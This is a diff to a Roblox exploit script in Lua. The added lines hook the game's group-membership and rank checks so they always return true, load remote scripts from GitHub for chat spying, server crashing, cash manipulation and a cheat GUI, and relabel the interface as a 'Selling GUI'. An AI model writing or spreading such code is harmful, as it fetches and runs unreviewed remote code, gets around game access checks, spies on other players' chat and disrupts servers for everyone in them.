@@ -36,7 +36,14 @@ for i, e in pairs(l:GetChildren()) do
 	end
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/others/main/commands.lua"))()
+hookfunction(game.Players.LocalPlayer.IsInGroup, function() return true end)
+hookfunction(game.Players.LocalPlayer.GetRankInGroup, function() return true end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/others/main/chatspy.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/others/main/crasher.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/cdhc/main/gui"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/Counter/main/Cash"))()
+game.CoreGui.Crostide_Recode.Frame.Frame.TextLabel.Text = "    JMAN's Selling GUI"
+game.CoreGui.Crostide_Recode.Frame.CreditsFrame.TextLabel.Text = "eyedress#0995"
 
 local plr = game.Players.LocalPlayer
 local ScreenHide = false
